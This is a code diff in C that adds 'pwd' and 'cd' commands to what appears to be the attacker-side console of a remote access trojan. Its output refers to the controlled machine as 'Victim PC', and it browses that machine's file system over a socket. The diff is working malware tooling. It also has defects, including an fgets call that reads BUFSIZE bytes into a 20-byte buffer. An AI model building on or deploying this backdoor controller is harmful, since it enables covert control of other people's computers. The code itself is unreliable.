@@ -23,6 +23,7 @@ int clnt_sock;
 int main(int argc, char **argv){
 
     char menu[BUFSIZE];
+    char temp[20];
     int status;
     int size;
     int filehandle;
@@ -44,6 +45,7 @@ int main(int argc, char **argv){
         fgets(menu, BUFSIZE, stdin);
         fprintf(stderr, "\033[97m");
 
+        // help command
         if(!strcmp(menu, "help\n"))
             print_help_Command();
 
@@ -54,6 +56,7 @@ int main(int argc, char **argv){
                 exit(0);
         }
 
+        // ls command
         else if(!strcmp(menu, "ls\n")){
             send(clnt_sock, menu, sizeof(menu) + 1, 0);
             recv(clnt_sock, &size, sizeof(int), 0);
@@ -65,6 +68,36 @@ int main(int argc, char **argv){
             printf("\033[1;36mVictim PC's file list -----\033[1;0m\n");
             system("cat temp_ls.txt");
             system("rm temp_ls.txt");
+        }
+
+        // pwd command
+        else if (!strcmp(menu, "pwd\n")) {
+            strcpy(menu, "pwd");
+            send(clnt_sock, menu, 100, 0);
+            recv(clnt_sock, &size, sizeof(int), 0);
+            file = malloc(size);
+            recv(clnt_sock, file, size, 0);
+            filehandle = creat("temp_pwd.txt", 0777);
+            write(filehandle, file, size, 0);
+            close(filehandle);
+            printf("\033[1;36mVictim PC's PWD\033[1;0m\n");
+            system("cat temp_pwd.txt");
+            system("rm temp_pwd.txt");
+        }
+
+        // cd command
+        else if (!strcmp(menu, "cd\n")) {
+            strcpy(menu, "cd ");
+            printf("\033[1;32mcd >> ");
+            scanf("%s", menu + 3);
+            fgets(temp, BUFSIZE, stdin);
+            send(clnt_sock, menu, 100, 0);
+            recv(clnt_sock, &status, sizeof(int), 0);
+            if (status)
+                printf("\033[1;31mChange complete!!\n");
+            else {
+                printf("\033[1;31mChange fail..\n");
+            }
         }
 
 
